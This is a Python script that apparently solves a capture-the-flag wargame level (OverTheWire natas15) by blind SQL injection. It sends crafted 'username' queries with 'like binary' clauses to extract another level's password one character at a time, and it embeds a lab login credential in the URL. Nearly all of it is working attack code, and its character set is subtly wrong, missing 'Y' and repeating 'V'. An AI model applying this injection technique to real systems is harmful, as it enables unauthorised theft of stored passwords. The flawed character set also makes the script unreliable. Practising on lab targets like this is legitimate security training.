import requests

url = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
passchar = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXVZ1234567890'
string = 'This user exist'.encode("utf-8")
password = ""

for i in range(32):
	for j in passchar:
		req = requests.get(url+'?username=natas16" and password like binary "'+password+j+'%')
		#print(req.content)
		if req.content.find(string) != -1:
			password += j
			print("Password: "+password)
			break
